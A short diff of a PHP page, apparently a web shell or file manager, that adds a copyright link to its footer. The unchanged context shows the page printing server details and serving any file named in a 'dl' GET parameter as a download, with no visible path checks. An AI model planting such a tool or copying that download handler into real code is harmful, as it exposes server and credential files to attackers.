@@ -213,7 +213,9 @@ a{color:var(--cyan);text-decoration:none}a:hover{color:var(--cyan2)}
 @media(max-width:768px){.wrap{padding:10px}.toolbar{flex-direction:column}.tbl th:nth-child(3),.tbl td:nth-child(3){display:none}}
 </style></head><body>';
 }
-function _foot(){echo '<div class="footer">PHP '.PHP_VERSION.' &middot; '.php_uname('s').' &middot; '.@php_uname('n').'</div></body></html>';}
+function _foot(){
+    echo '<div class="footer">PHP '.PHP_VERSION.' &middot; '.php_uname('s').' &middot; '.@php_uname('n').' &middot; Copyright &copy; <a href="https://github.com/AnggaTechI" target="_blank">AnggaTechI</a></div></body></html>';
+}
 if(isset($_GET['dl'])&&is_file($d.'/'.$_GET['dl'])){
     $f=$d.'/'.$_GET['dl'];header('Content-Type:application/octet-stream');
     header('Content-Disposition:attachment;filename="'.basename($f).'"');header('Content-Length:'.filesize($f));
